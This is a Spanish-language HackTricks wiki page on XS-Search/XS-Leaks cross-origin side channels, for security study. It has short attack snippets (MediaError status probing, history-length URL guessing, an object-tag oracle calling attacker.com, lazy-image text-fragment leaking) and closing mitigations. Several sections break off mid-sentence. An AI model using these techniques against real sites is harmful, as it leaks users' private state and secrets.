# XS-Search/XS-Leaks

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y automatizar f√°cilmente flujos de trabajo impulsados por las herramientas de la comunidad m√°s avanzadas del mundo.\
Obtenga acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabaja en una **empresa de ciberseguridad**? ¬øQuiere ver su **empresa anunciada en HackTricks**? ¬øO quiere tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulte los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenga el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önase al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠game** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparta sus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informaci√≥n b√°sica**

XS-Search es una t√©cnica orientada a **filtrar informaci√≥n de origen cruzado** abusando de **ataques de canal lateral**.

Hay diferentes elementos en este tipo de ataque:

* **Web vulnerable**: es la web desde donde queremos filtrar alguna informaci√≥n.
* **Web del atacante**: es la web que el atacante crea que contiene el exploit y a la que accede la v√≠ctima.
* **M√©todo de inclusi√≥n**: es el m√©todo utilizado para cargar la web vulnerable desde la web del atacante (como window.open, iframe, fetch, etiqueta HTML con href...).
* **T√©cnica de filtrado**: despu√©s de acceder a la web vulnerable, se utilizar√° una t√©cnica para diferenciar entre el estado potencial de la web con la informaci√≥n obtenida del m√©todo de inclusi√≥n utilizado.
* **Estados**: los 2 posibles estados que puede tener la web vulnerable dependiendo de la v√≠ctima que queremos diferenciar.
* **Diferencias detectables**: esta es la informaci√≥n que el atacante tiene que intentar decidir el estado de la web vulnerable.

### Diferencias detectables

Para distinguir entre los 2 estados de la p√°gina vulnerable, se pueden observar varias cosas:

* **C√≥digo de estado**. Un atacante puede distinguir **diferentes c√≥digos de estado de respuesta HTTP** de origen cruzado (por ejemplo, errores del servidor, errores del cliente o errores de autenticaci√≥n).
* **Uso de API**. Esta diferencia detectable permite a un atacante detectar el **uso de las API web** en las p√°ginas, lo que le permite inferir si una p√°gina de origen cruzado est√° utilizando una API web JavaScript espec√≠fica.
* **Redirecciones**. Es posible detectar si una aplicaci√≥n web ha **navegado al usuario a una p√°gina diferente**. Esto no se limita a las redirecciones HTTP, sino que tambi√©n incluye las redirecciones desencadenadas por JavaScript o HTML.
* **Contenido de la p√°gina**. Estas diferencias detectables **aparecen en el cuerpo de la respuesta HTTP** o en subrecursos incluidos por la p√°gina. Por ejemplo, esto podr√≠a ser el **n√∫mero de marcos incluidos** (cf. XS-Leak en Gitlab) o diferencias de tama√±o de im√°genes.
* **Encabezado HTTP**. Un atacante puede detectar la presencia de un **encabezado de respuesta HTTP espec√≠fico** y puede ser capaz de recopilar su valor. Esto incluye encabezados como X-Frame-Options, Content-Disposition y Cross-Origin-Resource-Policy.
* **
```html
<object data="//example.com/404">
  <object data="//attacker.com/?error"></object>
</object>
```
En este caso, si `example.com/404` no se encuentra, se cargar√° `attacker.com/?error`.

### Tiempo de carga

* **M√©todos de inclusi√≥n**: Elementos HTML
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Resumen**: La API \*\*\*\* [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) se puede utilizar para medir cu√°nto tiempo se tarda en realizar una solicitud. Sin embargo, se pueden utilizar otros relojes, como la [API PerformanceLongTaskTiming](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming), que puede identificar tareas que se ejecutan durante m√°s de 50 ms.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) otro ejemplo en:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Tiempo de carga + tarea pesada forzada

Esta t√©cnica es similar a la anterior, pero el **atacante** tambi√©n **forzar√°** alguna acci√≥n para que tome un **tiempo relevante** cuando la **respuesta sea positiva o negativa** y medir√° ese tiempo.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Tiempo de descarga / antes de la descarga

* **M√©todos de inclusi√≥n**: Marcos
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Resumen**: El reloj [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) se puede utilizar para medir cu√°nto tiempo se tarda en realizar una solicitud. Se pueden utilizar otros relojes.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Los eventos [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) y [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) se pueden utilizar para medir el tiempo que tarda en recuperar un recurso. Esto funciona porque **`beforeunload`** se activa cuando el navegador solicita una nueva solicitud de navegaci√≥n, mientras que **`unload`** se activa cuando esa navegaci√≥n realmente ocurre. Debido a este comportamiento, es posible calcular la diferencia de tiempo entre estos dos eventos y medir
### Bucle de Eventos Ocupado <a href="#busy-event-loop" id="busy-event-loop"></a>

* **M√©todos de inclusi√≥n**:
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Resumen**: Medir el tiempo de ejecuci√≥n de una web bloqueando el bucle de eventos de un hilo y cronometrando **cu√°nto tiempo tarda el bucle de eventos en estar disponible nuevamente**.
* **Ejemplo de c√≥digo**:

Una de las principales ventajas de esta t√©cnica es su capacidad para evitar el Aislamiento de Sitios, ya que el origen del atacante puede influir en la ejecuci√≥n de otro origen.

{% hint style="warning" %}
En una medici√≥n de tiempo de ejecuci√≥n es posible **eliminar** los **factores de red** para obtener **mediciones m√°s precisas**. Por ejemplo, cargando los recursos utilizados por la p√°gina antes de cargarla.
{% endhint %}

### Pool de Conexiones

* **M√©todos de inclusi√≥n**: Solicitudes de JavaScript
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Resumen**: Un atacante podr√≠a bloquear todos los sockets excepto uno, cargar la web objetivo y al mismo tiempo cargar otra p√°gina, el tiempo hasta que se comience a cargar la √∫ltima p√°gina es el tiempo que tard√≥ en cargar la p√°gina objetivo.
* **Ejemplo de c√≥digo**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Los navegadores utilizan sockets para comunicarse con los servidores. Como el sistema operativo y el hardware en el que se ejecuta tienen recursos limitados, **los navegadores tienen que imponer un l√≠mite**. Para explotar la existencia de este l√≠mite, los atacantes pueden:

1. Verificar cu√°l es el l√≠mite del navegador, por ejemplo, 256 sockets globales.
2. Bloquear 255 sockets durante un largo per√≠odo de tiempo realizando 255 solicitudes a diferentes hosts que simplemente cuelgan la conexi√≥n.
3. Usar el socket 256 realizando una solicitud a la p√°gina objetivo.
4. Realizar una solicitud 257 a otro host. Dado que todos los sockets est√°n siendo utilizados (en los pasos 2 y 3), esta solicitud debe esperar hasta que el pool reciba un socket disponible. Este per√≠odo de espera proporciona al atacante el tiempo de sincronizaci√≥n de red del socket 256, que pertenece a la p√°gina objetivo. Esto funciona porque los 255 sockets en el paso 2 todav√≠a est√°n bloqueados, por lo que si el pool recibi√≥ un socket disponible, fue causado por la liberaci√≥n del socket en el paso 3. El tiempo para liberar el socket 256 est√° directamente relacionado con el tiempo que tarda en completarse la solicitud.

Para obtener m√°s informaci√≥n: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Pool de Conexiones por Destino

* **M√©todos de inclusi√≥n**: Solicitudes de JavaScript
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**:
* **Resumen**: Es como la t√©cnica anterior, pero en lugar de usar todos los sockets, Google **Chrome**
### Service Worker

* **M√©todos de inclusi√≥n**: Frames
* **Diferencia detectable**: Uso de API
* **M√°s informaci√≥n**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Resumen:** Detectar si un service worker est√° registrado para un origen espec√≠fico.
* **Ejemplo de c√≥digo**:

Los service workers son contextos de script impulsados por eventos que se ejecutan en un origen. Se ejecutan en segundo plano de una p√°gina web y pueden interceptar, modificar y **almacenar en cach√© recursos** para crear aplicaciones web sin conexi√≥n.\
Si un **recurso almacenado en cach√©** por un **service worker** se accede a trav√©s de un **iframe**, el recurso se **cargar√° desde la cach√© del service worker**.\
Para detectar si el recurso se **carg√≥ desde la cach√© del service worker**, se puede utilizar la **API de rendimiento**.\
Esto tambi√©n se podr√≠a hacer con un ataque de temporizaci√≥n (consulte el documento para obtener m√°s informaci√≥n).

### Cach√©

* **M√©todos de inclusi√≥n**: Fetch API
* **Diferencia detectable**: Temporizaci√≥n
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Resumen:** Detectar si un recurso se almacen√≥ en la cach√©.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Usando la [API de rendimiento](xs-search.md#performance-api) es posible verificar si un recurso est√° en cach√©.\
Para obtener m√°s informaci√≥n: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)

### Duraci√≥n de la red

* **M√©todos de inclusi√≥n**: Fetch API
* **Diferencia detectable**: Contenido de la p√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Resumen:** Es posible recuperar la duraci√≥n de la red de una solicitud desde la API de `rendimiento`.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## T√©cnica de mensajes de error

### Error de medios

* **M√©todos de inclusi√≥n**: Elementos HTML (Video, Audio)
* **Diferencia detectable**: C√≥digo de estado
* **M√°s informaci√≥n**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Resumen:** En FF, es posible filtrar con precisi√≥n el c√≥digo de estado de una solicitud de origen cruzado.
* **Ejemplo de c√≥digo**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
  document.getElementById("log").innerHTML += msg;
}

function startup() {
  let audioElement = document.getElementById("audio");
 // "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
  document.getElementById("startTest").addEventListener("click", function() {
    audioElement.src = document.getElementById("testUrl").value;
  }, false);
  // Create the event handler
  var errHandler = function() {
    let err = this.error;    
    let message = err.message;
    let status = "";
    
    // Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
    // Firefox error.message when the request loads successfully: "Failed to init decoder"
    if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
      status = "Success";
    }else{
      status = "Error";
    }
    displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
  };
  audioElement.onerror = errHandler;
}
```
La propiedad de mensaje de la interfaz **`MediaError`** contiene una **cadena diferente para recursos que se cargan correctamente**. Esto permite a un atacante inferir el estado de respuesta para un recurso de origen cruzado.

### Error de CORS

* **M√©todos de inclusi√≥n**: Fetch API
* **Diferencia detectable**: Encabezado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumen:** En SA, los mensajes de error de CORS filtran la URL completa de las redirecciones.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Esta t√©cnica permite a un atacante filtrar el objetivo de una redirecci√≥n que es iniciada por un sitio de origen cruzado.

CORS permite que los recursos web de acceso p√∫blico sean le√≠dos y utilizados desde cualquier sitio web. En los navegadores basados en Webkit, es posible **acceder a los mensajes de error de CORS cuando falla una solicitud CORS**. Un atacante puede enviar una solicitud habilitada para CORS a un sitio web objetivo que **redirige** seg√∫n el estado del usuario. Cuando el navegador deniega la solicitud, se filtra la **URL completa del objetivo de la redirecci√≥n** en el mensaje de error. Con este ataque, es posible detectar redirecciones, filtrar ubicaciones de redirecci√≥n y par√°metros de consulta sensibles.

### Error de SRI

* **M√©todos de inclusi√≥n**: Fetch API
* **Diferencia detectable**: Encabezado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumen:** En SA, los mensajes de error de SRI filtran el tama√±o de las respuestas de origen cruzado debido a mensajes de error detallados.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Un atacante puede filtrar el tama√±o de las respuestas de origen cruzado debido a **mensajes de error detallados**.

El atributo de integridad define un hash criptogr√°fico mediante el cual el navegador puede verificar que un recurso recuperado no ha sido manipulado. Este mecanismo de seguridad se llama Subresource Integrity (SRI). Se utiliza para la verificaci√≥n de integridad de los recursos servidos desde redes de entrega de contenido (CDN). Para evitar fugas de datos, los recursos de origen cruzado deben estar **habilitados para CORS**. De lo contrario, la respuesta no es elegible para la validaci√≥n de integridad. Similar al XS-Leak de error de CORS, es posible capturar el **mensaje de error despu√©s de una solicitud de recuperaci√≥n con un atributo de integridad fallida**. Un atacante puede **forzar** este **error** en cualquier solicitud especificando un **valor de hash falso**. En SA, este mensaje de error filtra la longitud del contenido del recurso solicitado. Un atacante puede utilizar esta filtraci√≥n para detectar diferencias en el tama√±o de la respuesta, lo que permite poderosos ataques XS-Leak.

### Violaci√≥n/Detecci√≥n de CSP

* **M√©todos de inclusi√≥n**: Pop-ups
* **Diferencia detectable**: C√≥digo de estado
* **M√°s informaci√≥n**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/
### Longitud m√°xima de URL - Lado del cliente

* **M√©todos de inclusi√≥n**: Pop-ups
* **Diferencia detectable**: C√≥digo de estado / Contenido
* **M√°s informaci√≥n**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Resumen:** Detectar diferencias en las respuestas debido a que la longitud de la respuesta de redireccionamiento puede ser demasiado grande para una solicitud que se pueda notar una diferencia.
* **Ejemplo de c√≥digo**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Seg√∫n la [documentaci√≥n de Chromium](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), la longitud m√°xima de URL de Chrome es de 2MB.

> En general, la _plataforma web_ no tiene l√≠mites en la longitud de las URL (aunque 2^31 es un l√≠mite com√∫n). _Chrome_ limita las URL a una longitud m√°xima de **2MB** por razones pr√°cticas y para evitar problemas de denegaci√≥n de servicio en la comunicaci√≥n entre procesos.

Por lo tanto, si la **URL de redireccionamiento respondida es m√°s grande en uno de los casos**, es posible hacer que se redirija con una **URL mayor a 2MB** para alcanzar el **l√≠mite de longitud**. Cuando esto sucede, Chrome muestra una p√°gina de **`about:blank#blocked`**.

La **diferencia notable** es que si la **redirecci√≥n** se **complet√≥**, `window.origin` arroja un **error** porque un origen cruzado no puede acceder a esa informaci√≥n. Sin embargo, si se **alcanz√≥ el l√≠mite** y la p√°gina cargada fue **`about:blank#blocked`**, el **`origin`** de la ventana sigue siendo el del **padre**, que es una informaci√≥n **accesible**.

Toda la informaci√≥n adicional necesaria para alcanzar los **2MB** se puede agregar a trav√©s de un **hash** en la URL inicial para que se **use en la redirecci√≥n**.

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### M√°ximo de redirecciones

* **M√©todos de inclusi√≥n**: Fetch API, Frames
* **Diferencia detectable**: C√≥digo de estado
* **M√°s informaci√≥n**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Resumen:** Abusar del l√≠mite de redirecciones para detectar redirecciones.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Si el n√∫mero **m√°ximo** de **redirecciones** que sigue un navegador es de **20**, un atacante podr√≠a intentar cargar su p√°gina con **19 redirecciones** y finalmente **enviar a la v√≠ctima** a la p√°gina probada. Si se produce un **error**, entonces la p√°gina estaba intentando **redirigir a la v√≠ctima**.

### Longitud del historial

* **M√©todos de inclusi√≥n**: Frames, Pop-ups
* **Diferencia detectable**: Redirecciones
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Resumen:** El c√≥digo JavaScript manipula el historial del navegador y se puede acceder mediante la propiedad de longitud.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

La API de Historial permite que el c√≥digo JavaScript manipule el historial del navegador, que **guarda las p√°ginas visitadas por un usuario**. Un atacante puede usar la propiedad de longitud como m√©todo de inclusi√≥n: para detectar la navegaci√≥n de JavaScript y HTML.\
**Comprobando `history.length`**, haciendo que un usuario **navegue** a una p√°gina, **cambi√°ndola** de **vuelta** al mismo origen y **comprobando** el nuevo valor de **`history.length`**.

### Longitud del historial con la misma URL

* **M√©todos de inclusi√≥n**: Frames, Pop-ups
* **Diferencia detectable**: Si la URL es la misma que la adivinada
* **Resumen:** Es posible adivinar si la ubicaci√≥n de un marco/pop-up est√° en una URL espec√≠fica abusando de la longitud del historial.
* **Ejemplo de c√≥digo**: A continuaci√≥n

Un atacante podr√≠a usar c√≥digo JavaScript para **manipular la ubicaci√≥n del marco/pop-up a una adivinada** e **inmediatamente** **cambiarla a `about:blank`**. Si la longitud del historial aument√≥, significa que la URL era correcta y tuvo tiempo de **aumentar porque la URL no se recarga si es la misma**. Si no aument√≥, significa que **intent√≥ cargar la URL adivinada** pero porque **inmediatamente despu√©s** cargamos **`about:blank`**, la **longitud del historial nunca aument√≥** al cargar la URL adivinada.
```javascript
async function debug(win, url) {
    win.location = url + '#aaa';
    win.location = 'about:blank';
    await new Promise(r => setTimeout(r, 500));
    return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Conteo de Frames

* **M√©todos de inclusi√≥n**: Frames, Pop-ups
* **Diferencia detectable**: Contenido de la p√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Resumen:** Leer el n√∫mero de frames (window.length).
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Contar el **n√∫mero de frames en una p√°gina web** abierta a trav√©s de `iframe` o `window.open` puede ayudar a identificar el **estado del usuario en esa p√°gina**. Adem√°s, si la p√°gina siempre tiene el mismo n√∫mero de frames, verificar **continuamente** el n√∫mero de frames puede ayudar a identificar un **patr√≥n** que podr√≠a filtrar informaci√≥n.

Un ejemplo de esta t√©cnica es que en Chrome, un **PDF** se puede **detectar** con el **conteo de frames** porque se utiliza internamente un `embed`. Hay [Par
### Obtenci√≥n de Tiempos

* **M√©todos de inclusi√≥n**: API Fetch
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Resumen:** La API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) se puede utilizar para medir cu√°nto tiempo se tarda en realizar una solicitud. Se pueden utilizar otros relojes.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Obtenci√≥n de Tiempos entre Ventanas

* **M√©todos de inclusi√≥n**: Pop-ups
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Resumen:** La API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) se puede utilizar para medir cu√°nto tiempo se tarda en realizar una solicitud utilizando `window.open`. Se pueden utilizar otros relojes.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas de la comunidad **m√°s avanzadas** del mundo.\
Obtenga acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Con Inyecci√≥n de HTML o Reinyecci√≥n

Aqu√≠ puede encontrar t√©cnicas para exfiltrar informaci√≥n de un HTML de origen cruzado **inyectando contenido HTML**. Estas t√©cnicas son interesantes en casos en los que, por cualquier motivo, se puede **inyectar HTML pero no se puede inyectar c√≥digo JS**.

### Markup Colgante

{% content-ref url="dangling-markup-html-scriptless-injection.md" %}
[dangling-markup-html-scriptless-injection.md](dangling-markup-html-scriptless-injection.md)
{% endcontent-ref %}

### Carga Diferida de Im√°genes

Si necesita **exfiltrar contenido** y puede **agregar HTML previo al secreto**, debe verificar las **t√©cnicas comunes de markup colgante**.\
Sin embargo, si por alguna raz√≥n **DEBE** hacerlo **car√°cter por car√°cter** (tal vez la comunicaci√≥n sea a trav√©s de un acierto en la cach√©), puede utilizar este truco.

Las **im√°genes** en HTML tienen un atributo "**carga**" cuyo valor puede ser "**diferida**". En ese caso, la imagen se cargar√° cuando se vea y no mientras se carga la p√°gina:
```html
<img src=/something loading=lazy >
```
Por lo tanto, lo que puedes hacer es **a√±adir muchos caracteres basura** (por ejemplo, **miles de "W"**) para **llenar la p√°gina web antes del secreto**. Hacemos esto para que la imagen no se cargue al principio.

Sin embargo, haces que el **bot acceda a la p√°gina** con algo como
```
#:~:text=SECR
```
Entonces, la p√°gina web ser√° algo como: **`https://victim.com/post.html#:~:text=SECR`**

Donde post.html contiene los caracteres basura del atacante y la imagen de carga lenta, y luego se agrega el secreto del bot.

Lo que este texto har√° es hacer que el bot acceda a cualquier texto en la p√°gina que contenga el texto `SECR`. Como ese texto es el secreto y est√° justo **debajo de la imagen**, la **imagen solo se cargar√° si el secreto adivinado es correcto**. As√≠ que ah√≠ tienes tu or√°culo para **filtrar el secreto car√°cter por car√°cter**.

Algunos ejemplos de c√≥digo para explotar esto: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

Encuentra **otro ejemplo usando carga lenta** aqu√≠:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Si se utiliza `jQuery(location.hash)`, es posible averiguar mediante el tiempo si existe alg√∫n contenido HTML, esto se debe a que si el selector `main[id='site-main']` no coincide, no es necesario comprobar el resto de los **selectores**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Inyecci√≥n de CSS

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Defensas

En esta secci√≥n se pueden encontrar algunas de las mitigaciones recomendadas en [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf), sin embargo, hay m√°s mitigaciones en cada secci√≥n de la wiki [https://xsleaks.dev/](https://xsleaks.dev/). Consulte all√≠ para obtener m√°s informaci√≥n sobre c√≥mo protegerse contra estas t√©cnicas.

### Mitigaciones del m√©todo de inclusi√≥n

* **Elementos HTML**. Se puede utilizar el **encabezado CORP para controlar si las p√°ginas pueden incrustar un recurso**. CORP puede establecerse en misma origen o mismo sitio y bloquea cualquier solicitud de origen cruzado o respectivamente de sitio cruzado a ese recurso. En el **lado del cliente**, los navegadores basados en Chromium utilizan el algoritmo **CORB** para decidir si se deben permitir o denegar las solicitudes de recursos de origen cruzado.
* **Marcos**. La principal defensa para **evitar que los elementos iframe carguen recursos HTML** es el uso de **X-Frame-Options**. Alternativamente, la directiva CSP frame-ancestors puede lograr un resultado similar. Si se niega la incrustaci√≥n, el m√©todo de inclusi√≥n no puede detectar una diferencia en las respuestas.
* **Ventanas emergentes**. Para restringir el acceso a `window.opener`, el encabezado de respuesta HTTP **COOP** define tres valores diferentes: unsafe-none (predeterminado), same-origin-allow-popups y same-origin. Estos valores se pueden utilizar para **aislar las pesta√±as de navegaci√≥n y las ventanas emergentes** y, por lo tanto, mitigar las t√©cnicas de fuga basadas en ventanas emergentes.
